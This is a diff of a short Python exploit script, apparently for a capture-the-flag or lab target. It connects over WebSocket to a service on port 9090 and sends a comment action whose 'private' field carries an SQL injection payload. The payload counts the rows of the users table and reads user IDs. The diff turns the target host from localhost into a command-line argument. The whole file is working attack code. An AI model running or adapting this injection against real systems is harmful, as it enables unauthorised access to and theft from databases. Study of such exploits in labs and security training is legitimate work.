@@ -1,19 +1,31 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import json, uuid, re
+import json
+import re
+import sys
+import uuid
+
 from websocket import create_connection
 
-url = 'ws://localhost:9090/api/ws'
+if len(sys.argv) < 2:
+    print(f'Usage: {sys.argv[0]} HOST')
+    exit(0)
+
+ip = sys.argv[1]
+
+url = f'ws://{ip}:9090/api/ws'
 
 ws = create_connection(url, timeout=5)
 ws.recv()
 
 username = uuid.uuid4().hex
 
-total_users_payload = "TRUE, (select count(username) from users), (select user_id from users where username='{}')) -- -".format(username)
+total_users_payload = "TRUE, (select count(username) from users), (select user_id from users where username='{}')) -- -".format(
+    username)
 
-data = json.dumps({'action': 'send_comment', 'data': {'username' : username, 'comment' : 'payload', 'private' : total_users_payload}})
+data = json.dumps(
+    {'action': 'send_comment', 'data': {'username': username, 'comment': 'payload', 'private': total_users_payload}})
 ws.send(data)
 ws.recv()
 
